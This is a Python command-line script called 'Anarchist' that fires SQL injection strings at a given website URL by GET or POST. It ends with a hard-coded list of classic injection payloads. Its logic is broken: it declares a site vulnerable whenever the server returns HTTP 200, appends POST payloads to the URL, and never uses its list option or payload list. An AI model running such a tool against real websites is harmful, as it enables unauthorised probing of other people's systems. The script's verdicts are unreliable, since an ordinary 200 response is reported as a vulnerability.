import os,sys,time,datetime, requests, argparse #bult-in libs
os.system("clear")
try:
    from termcolor import *
except ImportError:
    print("You don't have 'termcolor' module trying to install!!")
    os.system("pip3 install termcolor")
    
def banner():
    print(colored('''
                                    .__    .__          __   
_____    ____ _____ _______   ____ |  |__ |__| _______/  |_ 
\__  \  /    \\__  \\_  __ \_/ ___\|  |  \|  |/  ___/\   __\
 / __ \|   |  \/ __ \|  | \/\  \___|   Y  \  |\___ \  |  |  
(____  /___|  (____  /__|    \___  >___|  /__/____  > |__|  
     \/     \/     \/            \/     \/        \/       
    ''',"red"))

def main():
    main = argparse.ArgumentParser(description="Anarchist - A  Suite of tools to check SQL vulnerabilities in websites")
    main.add_argument("-u","--url",help="URL of the website to check")
    main.add_argument("-p","--payload",help="Payload to check for SQL injection")
    main.add_argument("-m","--method",help="Method to use for sending request")
    main.add_argument("-l","--list",help="List of websites to check for SQL injection")
    args = main.parse_args()



    if args.url and args.payload and args.method:
        url = args.url
        payload = args.payload
        method = args.method
        if method == "GET":
            try:
                r = requests.get(url+payload)
                if r.status_code == 200:
                    print(colored("[+] Website is vulnerable to SQL injection","green"))
                else:
                    print(colored("[-] Website is not vulnerable to SQL injection","red"))
            except:
                print(colored("[-] Error while sending request","red"))
        elif method == "POST":
            try:
                r = requests.post(url+payload)
                if r.status_code == 200:
                    print(colored("[+] Website is vulnerable to SQL injection","green"))
                else:
                    print(colored("[-] Website is not vulnerable to SQL injection","red"))
            except:
                print(colored("[-] Error while sending request","red"))
        else:
            print(colored("[-] Invalid method","red"))
    else:
        print(colored("[-] Invalid arguments","red"))
        print(colored("[-] Use -h or --help for help","red"))
if __name__ == "__main__":
    banner()
    main()

    payload = [
        ' OR 1 -- -',
        "' OR 1 -- -",
        "id=1",
        "id=34'",
        "'=0--+",
        "' OR 'x'='x",

    ]











